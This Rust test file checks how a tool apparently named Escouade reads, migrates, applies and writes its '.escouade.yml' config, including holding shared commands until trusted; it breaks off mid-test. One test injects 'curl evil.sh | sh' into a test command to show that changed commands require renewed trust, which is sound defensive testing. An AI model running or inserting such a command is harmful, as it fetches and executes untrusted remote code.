//! `.escouade.yml` (ESC-146): reading each key, the versions and their migrations, what is told of
//! a file that is not quite right, applying it to a project, its commands held until trusted, the
//! keys kept on this machine, writing it back, and its schema.

use std::collections::BTreeMap;

use serde_json::{json, Value};

use crate::model::{
    BoardSettings, CommitMode, EngineId, Project, RunCommand, WorktreeBase, WorktreeStep,
};
use crate::projectfile::{self as pf, Node, Warning, N};

fn project() -> Project {
    serde_json::from_value(json!({ "id": "p", "name": "app", "path": "/repo/app", "color": "" }))
        .unwrap()
}

const FULL: &str = "\
# yaml-language-server: $schema=https://escouade.dev/schemas/escouade.schema.json
version: 1
agents:
  engine: codex
private: true
worktrees:
  per_agent: true
  at_first_message: false
  base: origin/release
  dir: ../app-worktrees # next to the repository
  copy: [.env*, config/local.json]
  setup:
    - npm ci
    - command: cargo fetch
      cwd: src-tauri
      shell: bash
  teardown:
    - command: docker compose down
launch:
  - name: web
    command: npm run dev
    cwd: web
git:
  agent_branch_prefix: agent/
  ticket_branch_prefix: tickets/
  commit_mode: direct
  conventional_commits: false
board:
  on_approve: pr
  target_branch: develop
  merge_strategy: rebase
  draft_pr: true
  test_command: npm test
  tests_before_approve: true
  on_conflict: agent
  remove_worktree: false
  model: opus
  effort: high
  mode: plan
";

fn read(text: &str) -> pf::Read {
    pf::read(text).expect("readable")
}

fn lines(w: &[Warning]) -> Vec<Option<u32>> {
    w.iter().map(|w| w.line).collect()
}

#[test]
fn every_key_of_version_1_is_read() {
    let r = read(FULL);
    assert_eq!(r.version, 1);
    assert!(r.warnings.is_empty(), "{:?}", r.warnings);
    // Every key of the schema, no other.
    let keys: Vec<&str> = r.values.keys().map(String::as_str).collect();
    let mut all: Vec<&str> = pf::KEYS.iter().map(|k| k.path).collect();
    all.sort();
    assert_eq!(keys, all);
    let v = |k: &str| r.values[k].clone();
    assert_eq!(v("agents.engine"), json!("codex"));
    assert_eq!(v("worktrees.per_agent"), json!(true));
    assert_eq!(v("worktrees.at_first_message"), json!(false));
    assert_eq!(v("worktrees.base"), json!("origin/release"));
    assert_eq!(v("worktrees.dir"), json!("../app-worktrees"));
    assert_eq!(v("worktrees.copy"), json!([".env*", "config/local.json"]));
    assert_eq!(
        v("worktrees.setup"),
        json!([
            { "command": "npm ci", "shell": "", "cwd": "" },
            { "command": "cargo fetch", "shell": "bash", "cwd": "src-tauri" },
        ])
    );
    assert_eq!(
        v("worktrees.teardown"),
        json!([{ "command": "docker compose down", "shell": "", "cwd": "" }])
    );
    assert_eq!(
        v("launch"),
        json!([{ "name": "web", "command": "npm run dev", "shell": "", "cwd": "web" }])
    );
    assert_eq!(v("git.agent_branch_prefix"), json!("agent/"));
    assert_eq!(v("git.ticket_branch_prefix"), json!("tickets/"));
    assert_eq!(v("git.commit_mode"), json!("direct"));
    assert_eq!(v("git.conventional_commits"), json!(false));
    assert_eq!(v("board.on_approve"), json!("pr"));
    assert_eq!(v("board.target_branch"), json!("develop"));
    assert_eq!(v("board.merge_strategy"), json!("rebase"));
    assert_eq!(v("board.draft_pr"), json!(true));
    assert_eq!(v("board.test_command"), json!("npm test"));
    assert_eq!(v("board.tests_before_approve"), json!(true));
    assert_eq!(v("board.on_conflict"), json!("agent"));
    assert_eq!(v("board.remove_worktree"), json!(false));
    assert_eq!(v("private"), json!(true));
    assert_eq!(v("board.model"), json!("opus"));
    assert_eq!(v("board.effort"), json!("high"));
    assert_eq!(v("board.mode"), json!("plan"));
}

/// « Branche de départ des nouveaux worktrees » (ESC-160): `head`, `target` or a branch's name, read
/// and written; a branch named as one of the words goes through `refs/heads/`.
#[test]
fn the_branch_new_worktrees_start_from_is_a_key_of_the_file() {
    let k = pf::key_of("worktrees.base").unwrap();
    assert_eq!(k.kind, pf::Kind::Text);
    let mut p = project();
    assert_eq!(p.worktree_base, WorktreeBase::Head);
    assert_eq!(pf::get(&p, "worktrees.base"), json!("head"));
    for (text, base) in [
        ("target", WorktreeBase::Target),
        ("release/2.0", WorktreeBase::Branch("release/2.0".into())),
        ("origin/main", WorktreeBase::Branch("origin/main".into())),
        ("refs/heads/target", WorktreeBase::Branch("target".into())),
        ("refs/heads/head", WorktreeBase::Branch("head".into())),
        ("head", WorktreeBase::Head),
    ] {
        pf::set(&mut p, "worktrees.base", &json!(text));
        assert_eq!(p.worktree_base, base, "{text}");
        assert_eq!(pf::get(&p, "worktrees.base"), json!(text));
    }
    // Written right after « Créer le worktree au premier message ».
    let paths: Vec<&str> = pf::KEYS.iter().map(|k| k.path).collect();
    let at = paths
        .iter()
        .position(|p| *p == "worktrees.at_first_message")
        .unwrap();
    assert_eq!(paths[at + 1], "worktrees.base");
    let text = pf::write(None, &[("worktrees.base", json!("origin/main"))]).unwrap();
    assert!(text.contains("worktrees:\n  base: origin/main\n"), "{text}");
    assert_eq!(read(&text).values["worktrees.base"], json!("origin/main"));
}

/// The key it took the place of, `board.agents_from_target`, is still read when the file has no
/// `worktrees.base` (said, with its line), never written, and gone once `worktrees.base` is.
#[test]
fn the_former_agents_from_target_key_is_read_as_the_base() {
    let old = "version: 1\nboard:\n  target_branch: develop\n  agents_from_target: true\n";
    let r = read(old);
    assert_eq!(r.values["worktrees.base"], json!("target"));
    assert!(!r.values.contains_key("board.agents_from_target"));
    assert_eq!(lines(&r.warnings), [Some(4)]);
    assert!(
        r.warnings[0].text.contains("worktrees.base: target"),
        "{:?}",
        r.warnings
    );
    let mut p = project();
    pf::apply(&mut p, &r);
    assert_eq!(p.worktree_base, WorktreeBase::Target);
    // Off: from the folder's branch.
    let r = read(&old.replace("true", "false"));
    assert_eq!(r.values["worktrees.base"], json!("head"));
    // The new key wins, whatever their order.
    let both = format!("{old}worktrees:\n  base: release\n");
    let r = read(&both);
    assert_eq!(r.values["worktrees.base"], json!("release"));
    assert!(r.warnings.is_empty(), "{:?}", r.warnings);
    // A value that is no boolean: told, nothing read.
    let r = read(&old.replace("true", "maybe"));
    assert!(!r.values.contains_key("worktrees.base"));
    assert_eq!(lines(&r.warnings), [Some(4)]);
    // Written, the new key takes the place of the old one, the rest kept.
    let text = pf::write(Some(old), &[("worktrees.base", json!("target"))]).unwrap();
    assert!(!text.contains("agents_from_target"), "{text}");
    assert!(text.contains("  target_branch: develop\n"), "{text}");
    let r = read(&text);
    assert_eq!(r.values["worktrees.base"], json!("target"));
    assert!(r.warnings.is_empty(), "{:?}", r.warnings);
    // The schema still takes it, as deprecated.
    let s = pf::schema();
    let key = &s["properties"]["board"]["properties"]["agents_from_target"];
    assert_eq!(key["type"], "boolean");
    assert_eq!(key["deprecated"], true);
}

/// A project saved before ESC-160 with « Les agents partent de la branche cible » on starts its
/// worktrees from the target; the old switch is never saved again.
#[test]
fn a_project_saved_with_agents_from_target_keeps_it_as_its_base() {
    let saved = |on: bool| {
        let mut p: Project = serde_json::from_value(json!({
            "id": "p", "name": "app", "path": "/repo/app", "color": "",
            "board": { "target": "develop", "agentsFromTarget": on },
        }))
        .unwrap();
        p.settle_legacy();
        p
    };
    let p = saved(true);
    assert_eq!(p.worktree_base, WorktreeBase::Target);
    assert!(!p.board.agents_from_target);
    let json = serde_json::to_value(&p).unwrap();
    assert!(json["board"].get("agentsFromTarget").is_none(), "{json}");
    assert_eq!(json["worktreeBase"], json!({ "kind": "target" }));
    assert_eq!(saved(false).worktree_base, WorktreeBase::Head);
    // A base chosen since is never replaced.
    let mut p: Project = serde_json::from_value(json!({
        "id": "p", "name": "app", "path": "/repo/app", "color": "",
        "worktreeBase": { "kind": "branch", "branch": "release" },
        "board": { "agentsFromTarget": true },
    }))
    .unwrap();
    p.settle_legacy();
    assert_eq!(p.worktree_base, WorktreeBase::Branch("release".into()));
    let back: Project = serde_json::from_value(serde_json::to_value(&p).unwrap()).unwrap();
    assert_eq!(back.worktree_base, p.worktree_base);
}

/// « Créer le worktree au premier message, au nom de l’agent » (ESC-156): shared as the other
/// settings of the worktrees, on when the file does not say.
#[test]
fn the_worktree_at_the_first_message_is_a_key_of_the_file() {
    let k = pf::key_of("worktrees.at_first_message").unwrap();
    assert_eq!(k.kind, pf::Kind::Bool);
    assert!(!k.command);
    let mut p = project();
    assert!(p.worktree_at_first_message);
    assert_eq!(pf::get(&p, "worktrees.at_first_message"), json!(true));
    pf::set(&mut p, "worktrees.at_first_message", &json!(false));
    assert!(!p.worktree_at_first_message);
    assert_eq!(pf::get(&p, "worktrees.at_first_message"), json!(false));
    let schema = pf::schema();
    let key = &schema["properties"]["worktrees"]["properties"]["at_first_message"];
    assert_eq!(key["type"], "boolean");
    // Written right after « Un worktree par agent ».
    let paths: Vec<&str> = pf::KEYS.iter().map(|k| k.path).collect();
    let at = paths
        .iter()
        .position(|p| *p == "worktrees.per_agent")
        .unwrap();
    assert_eq!(paths[at + 1], "worktrees.at_first_message");
}

#[test]
fn an_unknown_key_is_told_with_its_line_and_what_it_looks_like() {
    let r = read("version: 1\nworktrees:\n  per_agnet: true\n  dir: wt\nbord:\n  draft_pr: true\nfuture_thing: 3\n");
    // The rest is read all the same.
    assert_eq!(r.values["worktrees.dir"], json!("wt"));
    assert_eq!(r.values.len(), 1);
    assert_eq!(lines(&r.warnings), vec![Some(3), Some(5), Some(7)]);
    assert!(r.warnings[0].text.contains("worktrees.per_agnet"));
    assert!(r.warnings[0].text.contains("worktrees.per_agent"));
    assert!(r.warnings[1].text.contains("board"));
    assert!(r.warnings[2].text.contains("future_thing"));
    // Nothing near: no proposal.
    assert!(!r.warnings[2].text.contains('?'));
}

#[test]
fn a_known_name_in_the_wrong_group_points_to_its_place() {
    let r = read("version: 1\nworktrees:\n  test_command: npm test\n");
    assert!(r.warnings[0].text.contains("board.test_command"));
    assert!(r.values.is_empty());
}

#[test]
fn an_invalid_value_is_told_with_its_line_the_rest_read() {
    let r = read(
        "version: 1\nboard:\n  merge_strategy: fast\n  draft_pr: yes\n  on_conflict: ask\nworktrees:\n  dir: /abs/wt\n  setup:\n    - command: ''\n    - npm ci\n    - [1, 2]\ngit:\n  agent_branch_prefix: 'bad prefix'\n",
    );
    assert_eq!(r.values["board.on_conflict"], json!("ask"));
    // The bad step goes, the good one stays.
    assert_eq!(
        r.values["worktrees.setup"],
        json!([{ "command": "npm ci", "shell": "", "cwd": "" }])
    );
    for k in [
        "board.merge_strategy",
        "board.draft_pr",
        "worktrees.dir",
        "git.agent_branch_prefix",
    ] {
        assert!(!r.values.contains_key(k), "{k} kept");
    }
    assert_eq!(
        lines(&r.warnings),
        vec![Some(3), Some(4), Some(7), Some(9), Some(11), Some(13)]
    );
    assert!(r.warnings[0].text.contains("fast"));
    assert!(r.warnings[0].text.contains("merge, squash, rebase"));
}

#[test]
fn a_quoted_true_is_no_boolean() {
    let r = read("version: 1\nboard:\n  draft_pr: 'true'\n  remove_worktree: TRUE\n");
    assert!(!r.values.contains_key("board.draft_pr"));
    assert_eq!(r.values["board.remove_worktree"], json!(true));
}

#[test]
fn a_newer_version_is_read_as_well_as_possible() {
    let r = read("version: 7\nboard:\n  draft_pr: true\n  auto_deploy: true\n");
    assert_eq!(r.version, 7);
    assert_eq!(r.values["board.draft_pr"], json!(true));
    assert_eq!(lines(&r.warnings), vec![Some(1), Some(4)]);
    assert!(r.warnings[0].text.contains('7'));
}

#[test]
fn no_version_or_an_unreadable_one_is_version_1_and_said() {
    let r = read("board:\n  draft_pr: true\n");
    assert_eq!(r.version, 1);
    assert_eq!(r.values["board.draft_pr"], json!(true));
    assert_eq!(lines(&r.warnings), vec![None]);
    let r = read("version: one\n");
    assert_eq!(r.version, 1);
    assert_eq!(lines(&r.warnings), vec![Some(1)]);
}

#[test]
fn a_file_that_is_no_yaml_mapping_cannot_be_read() {
    let e = pf::read("worktrees:\n  copy: [unclosed\nboard: x\n").unwrap_err();
    assert!(e.line.is_some());
    assert!(e.text.contains(pf::FILE));
    assert!(pf::read("- a\n- b\n").is_err());
    // Empty: nothing set, but its version said.
    assert!(read("").values.is_empty());
}

/// A migration of a version 2 that never was: `worktrees.per_agent` became `worktrees.isolate`.
fn rename_isolate(t: &mut Node, warnings: &mut Vec<Warning>) {
    if let N::Map(entries) = &mut t.v {
        for (_, _, g) in entries.iter_mut() {
            if let N::Map(inner) = &mut g.v {
                for (k, _, _) in inner.iter_mut() {
                    if k == "per_agent" {
                        *k = "isolate".into();
                        warnings.push(Warning {
                            line: None,
                            text: "migrated".into(),
                        });
                    }
                }
            }
        }
    }
}

fn drop_marker(t: &mut Node, _: &mut Vec<Warning>) {
    if let N::Map(entries) = &mut t.v {
        entries.retain(|(k, _, _)| k != "marker");
    }
}

#[test]
fn migrations_run_from_the_file_s_version_on() {
    let tree = || pf::tree("version: 1\nmarker: x\nworktrees:\n  per_agent: true\n").unwrap();
    let steps: &[pf::Migration] = &[rename_isolate, drop_marker];
    let names = |t: &Node| -> Vec<String> {
        let N::Map(e) = &t.v else { panic!() };
        let mut out = Vec::new();
        for (k, _, n) in e {
            out.push(k.clone());
            if let N::Map(inner) = &n.v {
                out.extend(inner.iter().map(|(s, _, _)| format!("{k}.{s}")));
            }
        }
        out
    };
    // From version 1: both.
    let mut t = tree();
    let mut w = Vec::new();
    pf::migrate(&mut t, 1, steps, &mut w);
    assert_eq!(names(&t), ["version", "worktrees", "worktrees.isolate"]);
    assert_eq!(w.len(), 1);
    // From version 2: the second only.
    let mut t = tree();
    pf::migrate(&mut t, 2, steps, &mut Vec::new());
    assert_eq!(names(&t), ["version", "worktrees", "worktrees.per_agent"]);
    // From the last one: none.
    let mut t = tree();
    pf::migrate(&mut t, 3, steps, &mut Vec::new());
    assert_eq!(
        names(&t),
        ["version", "marker", "worktrees", "worktrees.per_agent"]
    );
    // Version 1 is the first: nothing to migrate yet.
    assert_eq!(pf::MIGRATIONS.len() as u32, pf::VERSION - 1);
}

#[test]
fn applied_settings_change_the_project_commands_wait_for_trust() {
    let mut p = project();
    p.worktree_setup = vec![WorktreeStep {
        id: "s1".into(),
        command: "make".into(),
        ..Default::default()
    }];
    let r = read(FULL);
    let a = pf::apply(&mut p, &r);
    // Every setting without effect on the machine applies.
    assert!(p.worktree_per_agent);
    assert_eq!(p.engine, Some(EngineId::Codex));
    assert_eq!(p.worktree_dir, "../app-worktrees");
    assert_eq!(p.worktree_copy, [".env*", "config/local.json"]);
    assert_eq!(p.agent_branch_prefix, "agent/");
    assert_eq!(p.ticket_branch_prefix, "tickets/");
    assert_eq!(p.commit_mode, CommitMode::Direct);
    assert!(!p.board.conventional);
    assert_eq!(p.board.action, "pr");
    assert_eq!(p.board.target, "develop");
    assert_eq!(
        p.worktree_base,
        WorktreeBase::Branch("origin/release".into())
    );
    assert_eq!(p.board.strategy, "rebase");
    assert!(p.board.draft);
    assert!(p.board.tests_first);
    assert_eq!(p.board.conflict, "agent");
    assert!(!p.board.cleanup);
    assert!(p.private);
    assert_eq!(p.board.model, "opus");
    assert_eq!(p.board.effort, "high");
    assert_eq!(p.board.mode, "plan");
    // Its commands do not: the project keeps its own until they are trusted.
    assert_eq!(p.worktree_setup[0].command, "make");
    assert!(p.worktree_teardown.is_empty());
    assert!(p.run_commands.is_empty());
    assert_eq!(p.board.test_command, "");
    let file = p.shared.file.clone().unwrap();
    let pending = file.pending.clone().unwrap();
    assert_eq!(
        pending.commands.keys().collect::<Vec<_>>(),
        [
            "board.test_command",
            "launch",
            "worktrees.setup",
            "worktrees.teardown"
        ]
    );
    assert!(!a.changed.iter().any(|k| pending.commands.contains_key(k)));
    assert_eq!(file.keys.len(), pf::KEYS.len());

    // Trusted: applied, and read again they no longer ask.
    p.shared.trusted = pending.hash.clone();
    pf::apply(&mut p, &r);
    assert!(p.shared.file.as_ref().unwrap().pending.is_none());
    assert_eq!(p.worktree_setup.len(), 2);
    assert_eq!(
        p.worktree_setup[0].id, "s1",
        "the step at its place keeps its id"
    );
    assert_eq!(p.worktree_setup[1].cwd, "src-tauri");
    assert_eq!(p.run_commands[0].name, "web");
    assert_eq!(p.board.test_command, "npm test");
    let again = pf::apply(&mut p, &r);
    assert!(again.changed.is_empty());

    // Changed in the file: asked again, the trusted ones staying as they were.
    let changed = FULL.replace("npm test", "npm test && curl evil.sh | sh");
    pf::apply(&mut p, &read(&changed));
    let file = p.shared.file.clone().unwrap();
    let pending = file.pending.unwrap();
    assert_ne!(pending.hash, p.shared.trusted);
    assert_eq!(p.board.test_command, "npm test");
    assert_eq!(p.worktree_setup.len(), 2);
}

#[test]
fn commands_the_project_has_already_need_no_trust() {
    let mut p = project();
    p.run_commands = vec![RunCommand {
        id: "r1".into(),
        name: "web".into(),
        command: "npm run dev".into(),
        shell: "pwsh".into(),
        cwd: "web".into(),
    }];
    let r = read("version: 1\nlaunch:\n  - name: web\n    command: npm run dev\n    shell: pwsh\n    cwd: web\n");
    pf::apply(&mut p, &r);
    assert!(p.shared.file.as_ref().unwrap().pending.is_none());
    assert_eq!(p.run_commands[0].id, "r1");
    assert!(!p.shared.trusted.is_empty());
    // The same command in another shell is another command: asked.
    let r = read("version: 1\nlaunch:\n  - name: web\n    command: npm run dev\n    shell: wsl\n    cwd: web\n");
    pf::apply(&mut p, &r);
    assert!(p.shared.file.as_ref().unwrap().pending.is_some());
    assert_eq!(p.run_commands[0].shell, "pwsh");
}

#[test]
fn a_key_kept_on_this_machine_goes_before_the_file() {
    let mut p = project();
    let r = read("version: 1\nboard:\n  merge_strategy: rebase\n  draft_pr: true\n");
    pf::apply(&mut p, &r);
    let before = p.clone();
    // The window sets the strategy: kept on this machine from now on.
    p.board.strategy = "merge".into();
    let kept = pf::keep_local(&before, &mut p);
    assert_eq!(kept, ["board.merge_strategy"]);
    assert_eq!(p.shared.local, ["board.merge_strategy"]);
    // Read again, the file changed: its other keys apply, not that one.
    let r = read("version: 1\nboard:\n  merge_strategy: squash\n  draft_pr: false\n");
    pf::apply(&mut p, &r);
    assert_eq!(p.board.strategy, "merge");
    assert!(!p.board.draft);
    // A setting the file does not set is no business of it.
    let before = p.clone();
    p.board.cleanup = false;
    assert!(pf::keep_local(&before, &mut p).is_empty());
}

/// The window turns « tests before approval » off while the test command waits for trust: no
/// choice of the user's, the file's value stays.
#[test]
fn tests_first_turned_off_for_want_of_a_command_is_no_local_choice() {
    let mut p = project();
    pf::apply(&mut p, &read(FULL));
    assert!(p.board.tests_first);
    assert_eq!(p.board.test_command, "");
    let before = p.clone();
    p.board.tests_first = false;
    assert!(pf::keep_local(&before, &mut p).is_empty());
    assert!(p.board.tests_first);
}

#[test]
fn a_worktrees_dir_inside_the_project_is_refused_when_applied() {
    let mut p = project();
    let r = read("version: 1\nworktrees:\n  dir: .\n");
    pf::apply(&mut p, &r);
    assert_eq!(p.worktree_dir, "");
    assert_eq!(p.shared.file.unwrap().warnings.len(), 1);
}

fn full_project() -> Project {
    let mut p = project();
    let mut r = read(FULL);
    r.warnings.clear();
    pf::apply(&mut p, &r);
    p.shared.trusted = p
        .shared
        .file
        .as_ref()
        .unwrap()
        .pending
        .as_ref()
        .unwrap()
        .hash
        .clone();
    pf::apply(&mut p, &r);
    p
}

#[test]
fn exported_then_read_again_the_settings_are_the_same() {
    let p = full_project();
    let text = pf::write(None, &pf::export_values(&p)).unwrap();
    assert!(text.starts_with(&format!(
        "# yaml-language-server: $schema={}\n",
        pf::SCHEMA_URL
    )));
    let r = read(&text);
    assert!(r.warnings.is_empty(), "{:?}\n{text}", r.warnings);
    let mut back = project();
    pf::apply(&mut back, &r);
    for k in pf::KEYS {
        // Applied as they were, the commands apart (they wait for trust).
        assert!(
            k.command || pf::get(&back, k.path) == pf::get(&p, k.path),
            "{}",
            k.path
        );
        assert_eq!(r.values[k.path], pf::get(&p, k.path), "{}\n{text}", k.path);
    }
}

#[test]
fn values_that_need_quotes_come_back_as_they_were() {
    let mut p = project();
    p.worktree_copy = vec![
        "*.local".into(),
        "@secrets/x".into(),
        "true".into(),
        "a: b".into(),
        "#x".into(),
    ];
    p.board.test_command = "npm test -- --grep 'a b' # all".into();
    p.board.target = "1.0".into();
    let text = pf::write(None, &pf::export_values(&p)).unwrap();
    let r = read(&text);
    assert!(r.warnings.is_empty(), "{:?}\n{text}", r.warnings);
    assert_eq!(r.values["worktrees.copy"], json!(p.worktree_copy), "{text}");
    assert_eq!(
        r.values["board.test_command"],
        json!(p.board.test_command),
        "{text}"
    );
    assert_eq!(r.values["board.target_branch"], json!("1.0"), "{text}");
}

/// The files of `tests/fixtures/escouade-yml/`, what `write` makes of them byte for byte. Prettier
/// reads them too (`npm run format:check`): they are the proof its layout is the one it keeps.
const EXPORT: &str = include_str!("../../tests/fixtures/escouade-yml/export.yml");
const REPO_BEFORE: &str = include_str!("../../tests/fixtures/escouade-yml/repo-before.yml");
const REPO_AFTER: &str = include_str!("../../tests/fixtures/escouade-yml/repo-after.yml");

#[test]
fn a_new_file_is_written_as_the_fixture_says() {
    let mut p = full_project();
    p.worktree_teardown.clear();
    p.board.test_command = "npm test -- --grep 'a b' # all".into();
    let text = pf::write(None, &pf::export_values(&p)).unwrap();
    assert_eq!(text, EXPORT);
}

#[test]
fn a_file_written_over_is_written_as_the_fixture_says_and_read_the_same() {
    let copy = json!([".env*", ".vscode/settings.local.json"]);
    let launch = json!([
        { "name": "Application", "command": "npm run tauri dev", "shell": "pwsh" },
        { "name": "Site", "command": "npm run dev -- --host", "shell": "pwsh", "cwd": "website" },
        { "name": "Vidéo", "command": "npm run studio", "shell": "pwsh", "cwd": "video" },
    ]);
    let text = pf::write(
        Some(REPO_BEFORE),
        &[("worktrees.copy", copy.clone()), ("launch", launch)],
    )
    .unwrap();
    assert_eq!(text, REPO_AFTER);
    // Read as it was read before, the two changes apart.
    let (before, after) = (read(REPO_BEFORE), read(&text));
    assert!(after.warnings.is_empty(), "{:?}", after.warnings);
    for k in before.values.keys() {
        if !["launch", "worktrees.copy"].contains(&k.as_str()) {
            assert_eq!(after.values[k], before.values[k], "{k}");
        }
    }
    assert_eq!(after.values["worktrees.copy"], copy);
    assert_eq!(
        after.values["launch"][1]["command"],
        json!("npm run dev -- --host")
    );
}

#[test]
fn a_list_the_author_put_at_the_margin_is_written_indented_too() {
    let text = pf::write(
        Some("version: 1\nlaunch:\n- name: a\n  command: b\nworktrees:\n  copy:\n  - x\n"),
        &[
            ("launch", json!([{ "name": "c", "command": "d" }])),
            ("worktrees.copy", json!(["y"])),
        ],
    )
    .unwrap();
    assert_eq!(
        text,
        "version: 1\nlaunch:\n  - name: c\n    command: d\nworktrees:\n  copy:\n    - y\n"
    );
}

#[test]
fn a_list_under_a_key_the_file_lacks_is_indented_as_one_it_replaces() {
    let text = pf::write(
        Some("version: 1\n"),
        &[
            ("launch", json!([{ "name": "c", "command": "d" }])),
            ("worktrees.copy", json!(["y"])),
        ],
    )
    .unwrap();
    assert_eq!(
        text,
        "version: 1\nlaunch:\n  - name: c\n    command: d\nworktrees:\n  copy:\n    - y\n"
    );
}

#[test]
fn a_text_is_quoted_only_where_yaml_needs_it() {
    let copy = [
        ".env*", "", "*.local", "a: b", "a #b", "true", "l'app", "- x", "[x]", "x:",
    ];
    let text = pf::write(None, &[("worktrees.copy", json!(copy))]).unwrap();
    assert!(
        text.contains(
            "  copy:\n    - .env*\n    - ''\n    - '*.local'\n    - 'a: b'\n    - 'a #b'\n    - 'true'\n    - l'app\n    - '- x'\n    - '[x]'\n    - 'x:'\n"
        ),
        "{text}"
    );
    // An empty item is written (`''`) but read as no item at all, as the reader always did.
    let back: Vec<&str> = copy.into_iter().filter(|s| !s.is_empty()).collect();
    assert_eq!(read(&text).values["worktrees.copy"], json!(back));
}

/// The repository's own `.escouade.yml` is what Escouade writes: writing its values back over it
/// changes nothing, and they read as they did.
#[test]
fn the_repository_s_file_is_what_escouade_writes_back() {
    let text = include_str!("../../.escouade.yml");
    let r = read(text);
    assert!(r.warnings.is_empty(), "{:?}", r.warnings);
    let values: Vec<(&str, Value)> = pf::KEYS
        .iter()
        .filter_map(|k| r.values.get(k.path).map(|v| (k.path, v.clone())))
        .collect();
    assert!(values.len() > 10);
    assert_eq!(pf::write(Some(text), &values).unwrap(), text);
}

#[test]
fn writing_over_a_file_keeps_its_comments_and_the_keys_it_does_not_know() {
    let existing = "# Our team's settings\nversion: 1\nworktrees:\n  # always isolated\n  per_agent: true\n  shiny_new: 3\nboard:\n  merge_strategy: squash # we like it flat\n";
    let text = pf::write(
        Some(existing),
        &[
            ("board.merge_strategy", json!("rebase")),
            ("board.draft_pr", json!(true)),
            ("git.commit_mode", json!("direct")),
        ],
    )
    .unwrap();
    for kept in [
        "# Our team's settings",
        "# always isolated",
        "shiny_new: 3",
        "per_agent: true",
    ] {
        assert!(text.contains(kept), "{kept} lost:\n{text}");
    }
    let r = read(&text);
    assert_eq!(r.values["board.merge_strategy"], json!("rebase"));
    assert_eq!(r.values["board.draft_pr"], json!(true));
    assert_eq!(r.values["git.commit_mode"], json!("direct"));
    // No schema line added to a file that had none: it is the team's.
    assert!(!text.contains("yaml-language-server"));
}

#[test]
fn a_file_of_a_newer_version_or_unreadable_is_not_written_over() {
    assert!(pf::write(Some("version: 9\n"), &[("board.draft_pr", json!(true))]).is_err());
    assert!(pf::write(Some("a: [\n"), &[("board.draft_pr", json!(true))]).is_err());
}

/// « Projet privé » (ESC-163): read, applied, written; a file may make a project private, never
/// public again on a machine where it is: `private: false` is then kept apart, and said.
#[test]
fn private_is_a_key_the_file_may_turn_on_never_off() {
    let k = pf::key_of("private").unwrap();
    assert_eq!(k.kind, pf::Kind::Bool);
    let mut p = project();
    pf::apply(&mut p, &read("version: 1\nprivate: true\n"));
    assert!(p.private);
    assert_eq!(pf::get(&p, "private"), json!(true));
    let text = pf::write(None, &[("private", json!(true))]).unwrap();
    assert!(text.ends_with("version: 1\nprivate: true\n"), "{text}");

    // The file says false while the project is private here: it stays private, the key local.
    let r = read("version: 1\nprivate: false\nboard:\n  draft_pr: true\n");
    pf::apply(&mut p, &r);
    assert!(p.private);
    assert!(p.board.draft, "the rest of the file applies");
    assert_eq!(p.shared.local, ["private"]);
    let file = p.shared.file.clone().unwrap();
    assert!(
        file.warnings
            .iter()
            .any(|w| w.text.contains("private: false")),
        "{:?}",
        file.warnings
    );
    // Unticked by hand, then given back to the file: it applies, public as the file says.
    p.private = false;
    p.shared.local.clear();
    pf::apply(&mut p, &r);
    assert!(!p.private);
    assert!(p.shared.local.is_empty());
    // A project not private takes `false` as it is, and `true` makes it private.
    pf::apply(&mut p, &read("version: 1\nprivate: true\n"));
    assert!(p.private);
}

/// The model, effort and mode of the tickets' agents (ESC-163): read, applied, written; an effort
/// it does not know is told, and `bypassPermissions` never comes from the file nor goes into it.
#[test]
fn the_tickets_agents_model_effort_and_mode_are_keys_of_the_file() {
    let mut p = project();
    let r = read("version: 1\nboard:\n  model: sonnet\n  effort: xhigh\n  mode: acceptEdits\n");
    assert!(r.warnings.is_empty(), "{:?}", r.warnings);
    pf::apply(&mut p, &r);
    assert_eq!(
        (&*p.board.model, &*p.board.effort, &*p.board.mode),
        ("sonnet", "xhigh", "acceptEdits")
    );
    // Empty is the account's, read and written as such.
    let r = read("version: 1\nboard:\n  model: ''\n  effort:\n  mode: ''\n");
    assert!(r.warnings.is_empty(), "{:?}", r.warnings);
    pf::apply(&mut p, &r);
    assert_eq!(
        (&*p.board.model, &*p.board.effort, &*p.board.mode),
        ("", "", "")
    );

    let r = read("version: 1\nboard:\n  effort: huge\n  mode: bypassPermissions\n");
    assert!(r.values.is_empty(), "{:?}", r.values);
    assert_eq!(lines(&r.warnings), [Some(3), Some(4)]);
    assert!(
        r.warnings[0]
            .text
            .contains("low, medium, high, xhigh, max)"),
        "{}",
        r.warnings[0].text
    );
    assert!(
        r.warnings[1]
            .text
            .contains("bypassPermissions ne se partage pas"),
        "{}",
        r.warnings[1].text
    );

    // Exported: the mode `bypassPermissions` stays on this machine, the rest is written.
    p.board.model = "opus".into();
    p.board.mode = "bypassPermissions".into();
    let values = pf::export_values(&p);
    assert!(values.iter().all(|(k, _)| *k != "board.mode"));
    let text = pf::write(None, &values).unwrap();
    assert!(text.contains("  model: opus\n  effort: ''\n"), "{text}");
    assert!(!text.contains("mode: bypassPermissions"), "{text}");
}

/// What is a person's or a machine's never goes into the file (ESC-163): the account, the accounts
/// reserved to a private project, Remote Control, the agents in parallel, the autopilot, the
/// tickets' key and number, the name, the color.
#[test]
fn nothing_of_one_machine_or_person_is_exported() {
    let mut p = full_project();
    p.account = "acc-1".into();
    p.remote_control = true;
    p.shared_on_limit = true;
    p.board.max_parallel = 5;
    p.board.autopilot = false;
    p.board.prefix = "ZED".into();
    p.board.next_number = 42;
    p.color = "#ff0000".into();
    let text = pf::write(None, &pf::export_values(&p)).unwrap();
    for local in [
        "account",
        "remote",
        "shared_on_limit",
        "parallel",
        "autopilot",
        "ZED",
        "42",
        "next_number",
        "#ff0000",
        "name: app",
    ] {
        assert!(!text.contains(local), "{local} in\n{text}");
    }
    // The shared ones are.
    for shared in [
        "private: true",
        "  model: opus",
        "  effort: high",
        "  mode: plan",
    ] {
        assert!(text.contains(shared), "{shared} not in\n{text}");
    }
    // No key of `KEYS` names a field of one machine.
    for k in pf::KEYS {
        assert!(
            k.path != "board.prefix"
                && ![
                    "account",
                    "remote",
                    "parallel",
                    "autopilot",
                    "number",
                    "shared_on_limit"
                ]
                .iter()
                .any(|l| k.path.contains(l)),
            "{}",
            k.path
        );
    }
}

/// The new keys set in the window are kept on this machine, as the others (« Réglage local »).
#[test]
fn the_new_keys_set_in_the_window_are_kept_on_this_machine() {
    let mut p = project();
    pf::apply(
        &mut p,
        &read("version: 1\nprivate: true\nboard:\n  model: opus\n  effort: high\n  mode: plan\n"),
    );
    let before = p.clone();
    p.board.model = "sonnet".into();
    p.board.effort = "low".into();
    p.board.mode = "bypassPermissions".into();
